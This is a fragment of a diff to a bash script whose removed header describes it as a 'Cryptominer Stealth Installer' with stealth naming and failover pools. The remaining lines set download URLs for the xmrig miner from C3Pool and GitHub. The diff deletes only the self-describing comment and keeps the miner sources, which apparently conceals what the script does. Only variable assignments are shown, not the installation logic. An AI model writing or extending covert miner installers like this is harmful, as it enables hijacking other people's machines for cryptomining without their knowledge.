@@ -1,8 +1,5 @@
 #!/usr/bin/env bash
 
-# Unified Cryptominer Stealth Installer (Version 4.0)
-# Merges dynamic directory selection, GitHub/C3Pool fallbacks, failover pools, and stealth naming.
-
 VERSION="4.0-unified"
 C3POOL_DOWNLOAD_URL="https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz"
 XMRIG_LATEST_API="https://api.github.com/repos/xmrig/xmrig/releases/latest"
